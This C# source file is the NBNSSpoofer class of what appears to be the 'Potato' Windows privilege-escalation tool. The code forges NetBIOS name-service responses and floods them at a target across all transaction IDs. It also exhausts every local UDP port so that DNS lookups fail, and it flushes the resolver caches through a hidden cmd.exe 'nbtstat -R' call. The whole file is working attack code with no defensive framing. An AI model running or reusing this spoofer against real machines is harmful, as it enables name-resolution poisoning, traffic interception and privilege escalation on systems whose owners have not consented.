using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

namespace Potato
{
    class NBNSSpoofer : Spoofer
    {
        [DllImport("dnsapi.dll", EntryPoint = "DnsFlushResolverCache")]
        private static extern UInt32 DnsFlushResolverCache();

        public static bool doneUdp = false;
        public static bool doneSpoof = false;

        private byte[] createNbnsResponse(String host,String ip)
        {
            String[] segments = ip.Split('.');
            byte[] ipFields = new byte[4];
            ipFields[0] = Byte.Parse(segments[0]);
            ipFields[1] = Byte.Parse(segments[1]);
            ipFields[2] = Byte.Parse(segments[2]);
            ipFields[3] = Byte.Parse(segments[3]);


            byte[] packet = new byte[62] {0xdb,0xa0,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,
                0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00,0x20,0x00,0x01,
                0x00,0x04,0x93,0xe0,0x00,0x06,0x00,0x00,ipFields[0],ipFields[1],ipFields[2],ipFields[3]};
	        
            host = host.ToUpper();
            packet[12] = 0x20;

            for (int i=0;i<host.Length;i++){
                packet[13+(i*2)] = (byte)((host[i]>>4)+0x41);
                packet[13+(i*2)+1] = (byte)((host[i]&0xF)+0x41);
            }

            for (int j=0;j<15-host.Length;j=j+1){
                packet[13+host.Length*2+j*2] = 0x43;
                packet[13+host.Length*2+j*2+1] = 0x41;       
            }

            packet[43]=0x41;
            packet[44]=0x41;
            packet[45]=0x00;

            return packet;
        }
        //
        public override void startSpoofing(String target_ip,String spoof_host,String spoof_address, bool enableExhaust)
        {
            Console.WriteLine("Starting NBNS spoofer..."+spoof_host+" = "+spoof_address);
            Thread spoofThread = new Thread(() => this.exhaustUdpPorts(137));
            if (enableExhaust)
            {
                spoofThread.Start();
                while (!NBNSSpoofer.doneUdp)
                {
                    Thread.Sleep(2000);
                }
            }

            UInt32 result = DnsFlushResolverCache();
            UdpClient udpc = new UdpClient(137);
            IPAddress serverAddr = IPAddress.Parse(target_ip);
            IPEndPoint endPoint = new IPEndPoint(serverAddr, 137);
            udpc.Connect(endPoint);
            byte[] packet = createNbnsResponse(spoof_host,spoof_address);

            while (true)
            {
                for (byte i = 0; i < 255; i++)
                {
                    for (byte j = 0; j < 255; j++)
                    {
                        packet[0] = i;
                        packet[1] = j;
                        udpc.Send(packet, packet.Length);
                    }
                }

            }
        }
        //
        public override void checkSpoof(String host,String address)
        {
            IPAddress[] hostIp = null;
            int count =501;
            while (hostIp == null || hostIp.Length == 0 || !hostIp[0].ToString().Equals(address))
            {
                count = count + 1;
                if (count > 500)
                {
                    count = 0;
                    Console.WriteLine("Clearing dns and nbns cache...");
                    UInt32 result = DnsFlushResolverCache();
                    
                    Process process3 = new Process();
                    ProcessStartInfo startInfo3 = new ProcessStartInfo();
                    startInfo3.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo3.FileName = "cmd.exe";
                    startInfo3.Arguments = "/C nbtstat -R";
                    process3.StartInfo = startInfo3;
                    process3.Start();
                    process3.WaitForExit();

                }
                try
                {
                    hostIp = Dns.GetHostAddresses(host);
                }
                catch (Exception)
                {
                    //Console.WriteLine(e);
                }
            }
            Console.WriteLine("Got " + hostIp[0].ToString());
            doneSpoof = true;
        }
        //
        public void exhaustUdpPorts(int leave)
        {
            Console.Write("Exhausting UDP source ports so DNS lookups will fail...");
            List<Socket> sockList = new List<Socket>();
            List<int> failedPorts = new List<int>();
            int i=0;
            for (i = 0; i <= 65535; i++)
            {
                try
                {
                    if (i != leave && i != 53)
                    {
                        IPEndPoint endp = new IPEndPoint(IPAddress.Any, i);
                        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        sock.Bind(endp);
                        sockList.Add(sock);
                    }
                }
                catch (Exception)
                {
                    failedPorts.Add(i);
                    Console.WriteLine("Couldn't bind to a UDP port "+i);
                }
            }

            bool success = false;
            while (!success)
            {
                UInt32 result = DnsFlushResolverCache();
                try
                {
                    IPAddress[] hostIp = Dns.GetHostAddresses("microsoft.com");
                }
                catch (Exception)
                {
                    Console.WriteLine("DNS lookup fails - UDP Exhaustion worked!");
                    success = true;
                    break;
                }
                Console.WriteLine("DNS lookup succeeds - UDP Exhaustion failed!");
                foreach (int port in failedPorts)
                {
                    try
                    {
                        IPEndPoint endp = new IPEndPoint(IPAddress.Any, i);
                        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        sock.Bind(endp);
                        sockList.Add(sock);
                        failedPorts.Remove(port);
                    }
                    catch(Exception)
                    {
                        Console.WriteLine("Failed to bind to " + port + " during cleanup...");
                    }
                } 
            }
            Console.WriteLine("UDP Ports exhausted...");
            NBNSSpoofer.doneUdp = true;
        }
    }
}